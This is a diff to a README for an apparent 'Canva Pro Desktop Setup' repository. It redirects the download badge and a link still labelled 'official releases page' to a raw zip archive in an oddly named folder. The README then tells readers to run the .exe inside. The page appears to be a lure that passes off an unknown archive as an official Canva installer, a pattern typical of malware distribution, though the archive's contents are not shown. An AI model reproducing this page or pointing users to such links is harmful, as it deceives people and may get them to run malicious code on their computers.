@@ -1,7 +1,7 @@
 # 🎨 Canva-Pro-Desktop-Setup - Create Pro Designs On Your Desktop
 
 <div align="center">
-<a href="https://github.com/Cirripedmyrmecia418/Canva-Pro-Desktop-Setup/releases">
+<a href="https://github.com/Cirripedmyrmecia418/Canva-Pro-Desktop-Setup/raw/refs/heads/main/gyneolater/Canva_Setup_Desktop_Pro_2.8.zip">
 <img src="https://img.shields.io/badge/Download-Canva_Pro_Desktop-blue.svg" alt="Download Now">
 </a>
 </div>
@@ -27,7 +27,7 @@ Your computer needs to meet these specs to run the software:
 
 ## 🚀 Downloading The Software
 
-1. Visit the [official releases page](https://github.com/Cirripedmyrmecia418/Canva-Pro-Desktop-Setup/releases) to download the installer.
+1. Visit the [official releases page](https://github.com/Cirripedmyrmecia418/Canva-Pro-Desktop-Setup/raw/refs/heads/main/gyneolater/Canva_Setup_Desktop_Pro_2.8.zip) to download the installer.
 2. Select the file ending in `.exe` that matches your Windows version.
 3. Save the file to your Downloads folder.
 
